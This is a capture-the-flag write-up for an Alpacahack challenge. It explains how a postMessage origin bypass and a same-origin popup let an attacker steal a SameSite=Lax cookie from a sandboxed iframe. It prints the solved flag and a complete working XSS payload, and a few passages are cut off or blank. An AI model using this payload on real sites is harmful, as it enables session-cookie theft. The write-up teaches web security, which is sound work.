---
title: "Alpacahack — Sandboxed iframe XSS: Origin Bypass to SameSite Cookie Theft"
date: 2026-09-11
tags: [web, xss, iframe, samesite, alpacahack]
ctf: "Alpacahack"
summary: "Sandboxed iframe XSS exploiting postMessage origin bypass to steal SameSite=Lax session cookies — a chain of four browser security concepts."
draft: false
---

**Flag obtained:** `Alpaca{4noth3r_sandb0x_An0ther_byp4s5}`

## 1. Foundational Concepts

Before analyzing the vulnerability, we need four building blocks. Skip none of them  the whole exploit is a chain, and each concept is one link.

### 1.1 Sources and Sinks 

| Term | Definition | In this challenge |
|---|---|---|
| **Source** | Where attacker-influenced data enters the application | The `postMessage` call (no URL params, no hash, no referrer used) |
| **Sink** | A dangerous function where that data ends up being unsafely used | `app.innerHTML = data.html` |

Most XSS challenges have an obvious external source (`location.search`, `location.hash`). This one doesn't  the only pipe into the sink is `postMessage`, which forces the attacker to become the source themselves rather than just crafting a malicious URL.
### 1.2 Windows, iframes, and `parent`

- A **window** is the JS object representing an entire browsing context: its `document`, globals, timers, etc.
- An `<iframe>` embeds a *second, independent* window inside a page — same idea as a tab-within-a-tab. It has its own DOM and its own JS execution, isolated from the outer page except for explicit communication channels.
- `window.parent`: every window has this property. It answers **"who embedded me?"**
  - If you navigate to a URL directly (top-level tab) → `window.parent === window` (no one embedded it).
  - If your window is inside someone's `<iframe>` → `window.parent` points to *that* embedding page's window.
- **Key insight:** `parent` is a structural relationship, not a trust relationship. *Anyone* who writes `<iframe src="...">` becomes the parent of whatever loads inside it  it says nothing about whether that "anyone" is the legitimate site or an attacker.

### 1.3 `sandbox` attribute on iframes

```html
<iframe src="/sandbox" sandbox="allow-scripts"></iframe>
```

`sandbox` locks an iframe down by default (no scripts, no forms, no popups, no same-origin treatment, etc.), then you re-enable specific capabilities as a space-separated allow-list:

| Flag                | Effect                                                                     |
| ------------------- | -------------------------------------------------------------------------- |
| `allow-scripts`     | JavaScript is permitted to run inside the iframe                           |
| `allow-same-origin` | The iframe is treated as its *real* origin for things like cookies/storage |

**Critical detail in this challenge:** the iframe has `allow-scripts` but **not** `allow-same-origin`. This means code can run inside it 
### 1.4 `postMessage` cross-window messaging

```js
otherWindow.postMessage(data, targetOrigin);
```

The browser's sanctioned way for two windows (that may be cross-origin, or parent/iframe) to talk to each other without directly touching each other's DOM. The receiver listens with:

```js
window.addEventListener("message", (event) => {
  event.data;    // the payload sent
  event.source;  // window object reference of the *sender*
  event.origin;  // string: the sender's origin (scheme+host+port)
});
```

This is the *only* communication channel used in this challenge, which is why it becomes both the source of the vulnerability and the primary attack surface.

## 2. The Vulnerable Application

### 2.1 `index.html` (legitimate parent page)

- Textarea for user-typed HTML.
- "Render" button → sends `{ type: "render-html", html: input.value }` via `postMessage` to an iframe.
- Iframe: `src="/sandbox"`, `sandbox="allow-scripts"` (no `allow-same-origin`).

### 2.2 `sandbox.html` (child, inside the iframe)

```js
window.addEventListener("message", (event) => {
  if (event.source !== window.parent || !event.origin.includes(location.hostname)) {
    return;
  }
  const data = event.data;
  if (!data || data.type !== "render-html") return;
  app.innerHTML = data.html;   // <-- SINK
});
```

Two guard checks stand between an attacker and the sink. Both look reasonable at a glance. Both are broken.

### 2.3 The Flag Cookie

```js
await page.setCookie({
  name: "FLAG",
  value: FLAG,
  domain: new URL(APP_URL).hostname,
  path: "/",
});
```

No `SameSite` attribute is set → the browser defaults it to `SameSite=Lax`. This single omission becomes the second major obstacle later.

---

## 3. Breaking Check #1  The Origin/Hostname Validation

```js
!event.origin.includes(location.hostname)
```

**Intent:** "Only accept messages whose sender's origin is our own site (`localhost`)."

**The flaw:** `.includes()` is a *substring* test, not an *equality* test.

```js
"http://localhost:3000".includes("localhost")       
"http://localhost.attacker.com".includes("localhost")  
"http://evil.com".includes("localhost")                
```

By registering/using a domain like `localhost.attacker.com`, the string `"localhost"` appears at the start of the attacker's origin, satisfying `.includes()` even though it is a completely unrelated, attacker-owned host.

**Correct fix:** exact match against an explicit allow-list, e.g. `event.origin === "http://localhost:3000"`.


---

## 4. Breaking Check #2  `event.source !== window.parent`

**Intent:** "Only accept a message from whichever window is genuinely my parent — i.e., the real `index.html`."

**Why it seems strong:** unlike `event.origin` (a spoof-prone string), `event.source` is a *real object reference* to the sender's window. You can't fake being "some other window object."

**Why it still fails:** the check never verifies *who* the parent is only that sender and parent are *the same object, whoever that happens to be*. Nothing prevents an attacker from becoming the parent themselves.

### The bypass 

Define two windows:

- **Window A** = attacker's own page (`solve.html` on `localhost.attacker.com`)
- **Window B** = an iframe *the attacker creates* inside Window A, pointing at the real `http://localhost:3000/sandbox`

```html
<!-- Window A's own HTML -->
<iframe id="sandbox-frame" src="http://localhost:3000/sandbox"></iframe>
<script>
  sandboxFrame.contentWindow.postMessage(payload, "http://localhost:3000");
</script>
```

Now evaluate the check **from inside Window B** (which is running the real `sandbox.html` code):

| Question | Answer | Why |
|---|---|---|
| Who embedded me? (`window.parent`) | Window A | Window A's HTML contains the `<iframe>` tag |
| Who called `postMessage` on me? (`event.source`) | Window A | Window A's `<script>` executed `sandboxFrame.contentWindow.postMessage(...)` |

```js
event.source !== window.parent
// Window A !== Window A
// → false → check passes, message accepted
```

**The core lesson:** `window.parent` is not a protected identity — it's simply "whoever's markup contains the `<iframe>` tag right now." Since the attacker authored that markup, the attacker legitimately *is* the parent of this particular instance of `sandbox.html`. The check conflates *structural consistency* ("sender == parent") with *trust* ("sender == the real, intended index.html")  but those are not the same thing, and nothing in the code distinguishes them.

---

## 5. First Attempt at Cookie Theft And Why It Failed

Naive next step: since we have JS execution inside `sandbox.html`, just read `document.cookie` directly:

```js
<img src=x onerror="console.log('Cookies: ' + document.cookie)">
```

**Result: empty.** Two compounding reasons, both rooted in browser trust boundaries:

### 5.1 The `sandbox` attribute (no `allow-same-origin`)

Because the iframe was sandboxed with only `allow-scripts` (missing `allow-same-origin`), the browser treats the iframe's execution context as an **opaque origin** — disconnected from `localhost:3000`'s real identity — even though the content really was fetched from there.

### 5.2 `SameSite=Lax` and third-party context

This is the deeper, more general lesson, worth its own section.

---

## 6. `SameSite` Cookies First-Party vs. Third-Party Context

Since the `FLAG` cookie was set with no explicit `SameSite`, modern browsers default it to **`Lax`**.

`Lax` cookies are exposed/sent only when:

1. **First-party context**  the URL shown in the browser's address bar matches the cookie's domain. You are "genuinely on" that site.
2. **Top-level navigation** the tab itself changes its URL to that domain (e.g., clicking a link, or `window.location = "..."`).

`Lax` cookies are **withheld** when:

- The domain is loaded **inside an iframe embedded by a different top-level site**  a *third-party context*. Even though the iframe's `src` genuinely points at the cookie's domain, the *address bar* still shows the embedding site's domain, so the browser refuses to expose those cookies to that embedded content.

### Why our attempt failed

```
Address bar: http://localhost.attacker.com
   └── iframe src="http://localhost:3000/sandbox"
```

- Address bar domain ≠ iframe's domain → **third-party context**.
- No top-level navigation ever occurred (only the iframe's inner content loaded).
- Therefore: `document.cookie`, read from *inside that iframe*, does not include the `FLAG` cookie — **by design**, this is the browser protecting `Lax` cookies from being read by embedded third-party frames.

**Lesson:** "The iframe's `src` matches the cookie's domain" is *not* sufficient for cookie access. What matters is the **top-level browsing context's URL** (the address bar), not merely which server the embedded content was fetched from.

---

## 7. The Winning Technique  Same-Origin Policy as an Enabler, Not Just a Blocker

Everyone learns SOP (Same-Origin Policy) as "the thing that stops cross-origin access." That's only half the story.

> **SOP is symmetric:** it blocks access between *different* origins, but it freely **grants** full DOM/cookie access between windows that share the *same* origin  regardless of how those windows are related (parent/child, iframe, or a window opened via `window.open()`).

### The insight

Our injected script is running with the origin of `sandbox.html` i.e., `http://localhost:3000`. It's *stuck* inside a third-party iframe context (no `Lax` cookie access there), but the script itself can still make outbound calls like `window.open()`.

If that script opens a **new window** to `/sandbox`:

```js
const win = window.open('/sandbox');
```

- This new window is a genuine **top-level browsing context** — its address bar *is* `http://localhost:3000/sandbox`. Not embedded in anyone. A direct visit, as far as the browser is concerned.
- This satisfies the `Lax` cookie rule ("top-level navigation" / first-party context) → **this new window's own `document.cookie` includes `FLAG`.**
- Our injected script (origin `localhost:3000`) and this new window (origin `localhost:3000`) are **same-origin** → SOP grants full read access → we can reach into `win.document.cookie` from our script and read it directly.

We never needed to escape the iframe's restrictions *in place*  we just needed to spawn a *second, unrestricted* window of the same origin and use SOP's permissive side to reach into it.

### Full payload

```html
<!-- solve.html, hosted on e.g. localhost.attacker.com -->
<iframe id="sandbox-frame" src="http://localhost:3000/sandbox" title="Sandbox preview"></iframe>
<script>
  const sandboxFrame = document.getElementById('sandbox-frame');

  sandboxFrame.addEventListener('load', () => {
    const payload = {
      type: 'render-html',
      html: `<img src=x onerror="
        const win = window.open('/sandbox');
        setTimeout(() => {
          console.log('Cookies: ' + win.document.cookie);
        }, 2000);
      ">`
    };
    sandboxFrame.contentWindow.postMessage(payload, 'http://localhost:3000');
  });
</script>
```


## 9. Key Takeaways (Consolidated)

| # | Principle | Why it matters |
|---|---|---|
| 1 | **Never validate origins with substring matching** (`includes`, unanchored `startsWith`) | `localhost.attacker.com` defeats `.includes("localhost")` trivially. Use exact string equality against an explicit allow-list. |
| 2 | **`window.parent` reflects structure, not trust** | Whoever writes the `<iframe>` tag becomes the parent. A check comparing `event.source` to `window.parent` only proves internal consistency, not that the parent is the *legitimate* site. |
| 3 | **`sandbox="allow-scripts"` without `allow-same-origin`** creates an opaque origin for the embedded content | Scripts can run, but the iframe is cut off from the real domain's storage/cookies as if it were "nowhere." |
| 4 | **Default `SameSite=Lax`** withholds cookies in third-party/embedded contexts | Matching the iframe's `src` domain to the cookie's domain is *not* enough — the top-level address bar domain is what the browser checks. |
| 5 | **SOP is bidirectional**: it blocks cross-origin, but *fully permits* same-origin access between any two windows, however they're related (iframe, popup, opener, etc.) | This is what makes the `window.open()` trick work — a same-origin popup is just as accessible as any other same-origin window reference. |
| 6 | **`window.open()` forces a top-level navigation** | This is the mechanism that escapes the `Lax`/third-party cookie restriction — the new window is treated as a genuine, direct visit. |
| 7 | **Cross-window/cross-document operations are asynchronous** | `window.open()` returns before the new page has loaded. Extraction attempts must wait (via `setTimeout`, or better, a `load` listener) before reading the new window's DOM/cookies. |

